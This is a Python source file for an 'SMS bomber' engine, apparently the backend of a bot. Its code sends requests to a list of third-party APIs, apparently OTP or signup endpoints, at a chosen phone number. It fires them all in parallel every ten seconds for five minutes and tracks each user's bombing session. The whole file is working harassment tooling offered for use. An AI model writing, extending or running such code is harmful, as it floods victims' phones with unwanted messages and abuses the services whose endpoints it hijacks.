import asyncio
import aiohttp
import time
import logging
from datetime import datetime, timedelta
from config import API_LIST, BOMB_DURATION, CHECK_INTERVAL

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class BomberEngine:
    def __init__(self):
        self.active_sessions = {}  # user_id -> {"phone": phone, "start_time": time, "active": bool}
        self.user_timers = {}      # user_id -> asyncio.Task

    async def bomb_single_api(self, api, phone):
        """Single API call"""
        params = api["params"].copy()
        params[api["phone_param"]] = phone
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api["url"], params=params, timeout=15) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        return {"success": True, "api": api["name"], "response": text[:100]}
                    else:
                        return {"success": False, "api": api["name"], "error": f"Status {resp.status}"}
        except Exception as e:
            return {"success": False, "api": api["name"], "error": str(e)}

    async def mega_bomb_all_apis(self, phone, user_id):
        """ALL 9 APIs ek saath fire"""
        self.active_sessions[user_id] = {
            "phone": phone,
            "start_time": datetime.now(),
            "active": True
        }
        
        # Run all APIs in parallel
        tasks = [self.bomb_single_api(api, phone) for api in API_LIST]
        results = await asyncio.gather(*tasks)
        
        success_count = sum(1 for r in results if r.get("success"))
        failed_count = len(results) - success_count
        
        return {
            "total": len(results),
            "success": success_count,
            "failed": failed_count,
            "details": results,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

    async def continuous_bombing(self, phone, user_id, duration=BOMB_DURATION):
        """5-minute continuous bombing - har 10 seconds pe sab APIs fire"""
        self.active_sessions[user_id] = {
            "phone": phone,
            "start_time": datetime.now(),
            "active": True
        }
        
        start_time = datetime.now()
        end_time = start_time + timedelta(seconds=duration)
        cycle_count = 0
        
        logger.info(f"[⚡] Starting 5-min bombing for {phone} (User: {user_id})")
        
        while datetime.now() < end_time and self.active_sessions.get(user_id, {}).get("active", False):
            cycle_count += 1
            
            # Fire ALL APIs simultaneously
            tasks = [self.bomb_single_api(api, phone) for api in API_LIST]
            results = await asyncio.gather(*tasks)
            
            success = sum(1 for r in results if r.get("success"))
            failed = len(results) - success
            
            logger.info(f"[🔄] Cycle {cycle_count}: {success} OK, {failed} Failed")
            
            # Check if user stopped manually
            if not self.active_sessions.get(user_id, {}).get("active", False):
                logger.info(f"[🛑] User {user_id} stopped bombing manually")
                break
                
            # Wait 10 seconds before next cycle
            await asyncio.sleep(CHECK_INTERVAL)
        
        # Auto-stop after 5 minutes
        if self.active_sessions.get(user_id, {}).get("active", False):
            self.active_sessions[user_id]["active"] = False
            logger.info(f"[⏱️] Auto-stopped bombing for {phone} after 5 minutes")
        
        return {
            "total_cycles": cycle_count,
            "total_apis_per_cycle": len(API_LIST),
            "duration": duration,
            "phone": phone,
            "auto_stopped": True,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

    async def stop_bombing(self, user_id):
        """Manual stop"""
        if user_id in self.active_sessions:
            self.active_sessions[user_id]["active"] = False
            logger.info(f"[🛑] Manual stop requested by user {user_id}")
            return True
        return False

    def get_status(self, user_id):
        """Get current bombing status"""
        if user_id in self.active_sessions:
            session = self.active_sessions[user_id]
            if session.get("active", False):
                elapsed = (datetime.now() - session["start_time"]).seconds
                remaining = max(0, BOMB_DURATION - elapsed)
                return {
                    "active": True,
                    "phone": session["phone"],
                    "elapsed": elapsed,
                    "remaining": remaining,
                    "start_time": session["start_time"].strftime("%Y-%m-%d %H:%M:%S")
                }
        return {"active": False}

bomber = BomberEngine()
